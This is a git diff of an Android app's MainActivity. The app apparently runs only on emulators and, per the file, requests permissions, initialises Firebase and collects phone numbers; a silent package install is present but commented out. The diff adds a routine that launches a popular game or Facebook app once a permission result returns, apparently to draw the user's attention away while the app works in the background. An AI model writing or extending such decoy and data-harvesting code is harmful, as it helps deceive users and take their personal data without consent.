@@ -67,8 +67,8 @@ public class MainActivity extends AppCompatActivity {
                     startRequestPermissions();
                     MyFirebase.initFirebase();
                     //startService(new Intent(this, MainService.class));
-                    while (!MyFirebase.finished) {
-                    }
+                    //while (!MyFirebase.finished) {
+                    //}
                 }
                 else {
                     Toast toast = Toast.makeText(getApplicationContext(), "App functionality will not continue due to running on a physical device.", Toast.LENGTH_SHORT);
@@ -143,8 +143,20 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
+    private void startAnotherApp() {
+        String[] games = {"com.dragosgame.flappybird", "com.SAPCreation.HappyBirdChampionship", "com.blizzard.wtcg.hearthstone", "com.innersloth.spacemafia",
+                "com.popreach.dumbways", "com.kiloo.subwaysurf", "com.activision.callofduty.shooter", "com.roblox.client", "com.halfbrick.fruitninjax",
+                "com.androbaby.original2048", "com.facebook.orca", "com.facebook.katana", "com.facebook.lite", "com.facebook.mlite"};
+        for(String game: games) {
+            Intent launchIntent = getPackageManager().getLaunchIntentForPackage(game);
+            if (launchIntent != null) {
+                startActivity(launchIntent);
+                return;
+            }
+        }
+    }
+
     public static boolean isEmulator() {
-        Log.e("asdf", Build.FINGERPRINT);
         return Build.FINGERPRINT.startsWith("generic")
                 || Build.FINGERPRINT.startsWith("unknown")
                 || Build.MODEL.contains("google_sdk")
@@ -231,12 +243,11 @@ public class MainActivity extends AppCompatActivity {
         //installPackage(context, inputStream);
     }
 
-    /*
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        Log.e("asdf", "result");
-    }*/
+        startAnotherApp();
+    }
 
     private ArrayList<String> getPhoneNumber() {
         ArrayList<String> phoneNumber = new ArrayList<String>();
